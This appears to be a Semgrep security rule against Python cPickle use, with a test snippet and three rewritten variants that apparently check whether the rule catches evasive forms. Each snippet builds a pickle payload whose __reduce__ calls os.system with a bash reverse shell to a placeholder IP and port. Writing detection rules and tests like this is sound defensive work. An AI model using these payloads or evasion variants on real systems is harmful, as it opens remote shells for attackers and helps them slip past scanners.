### Rule
``` yaml
rules:
  - id: avoid-cPickle
    metadata:
      owasp:
        - A08:2017 - Insecure Deserialization
        - A08:2021 - Software and Data Integrity Failures
      cwe:
        - "CWE-502: Deserialization of Untrusted Data"
      references:
        - https://docs.python.org/3/library/pickle.html
      category: security
      technology:
        - python
      cwe2022-top25: true
      cwe2021-top25: true
      subcategory:
        - audit
      likelihood: LOW
      impact: MEDIUM
      confidence: LOW
      license: Commons Clause License Condition v1.0[LGPL-2.1-only]
      vulnerability_class:
        - "Insecure Deserialization "
    languages:
      - python
    message: Avoid using `cPickle`, which is known to lead to code execution
      vulnerabilities. When unpickling, the serialized data could be manipulated
      to run arbitrary code. Instead, consider serializing the relevant data as
      JSON or a similar text-based serialization format.
    severity: WARNING
    patterns:
      - pattern: cPickle.$FUNC(...)
      - pattern-not: cPickle.$FUNC("...")
````
### Code Snippet
```python
import cPickle
import socket


class Shell_code(object):
    def __reduce__(self):
        return (
            os.system,
            ('/bin/bash -i >& /dev/tcp/"Client IP"/"Listening PORT" 0>&1',),
        )


# ruleid: avoid-cPickle
shell = cPickle.dumps(Shell_code())
```
### Transformation 1*
```python
import cPickle
import socket


class Shell_code(object):
    def __reduce__(self):
        return (
            os.system,
            ('/bin/bash -i >& /dev/tcp/"Client IP"/"Listening PORT" 0>&1',),
        )


# ruleid: avoid-cPickle
myfunc = cPickle.dumps
shell = myfunc(Shell_code())
```
### Transformation 2
```python
import os
import cPickle

class Shell_code(object):
    def __reduce__(self):
        return (os.system, ('/bin/bash -i >& /dev/tcp/"Client IP"/"Listening PORT" 0>&1',))

methods = {"dump": cPickle.dumps}
shell = methods["dump"](Shell_code())
```
### Transformation 3
```python
import os

cPickle_module = __import__('cPickle')

class Shell_code(object):
    def __reduce__(self):
        return (os.system, ('/bin/bash -i >& /dev/tcp/"Client IP"/"Listening PORT" 0>&1',))

shell = cPickle_module.dumps(Shell_code())
```

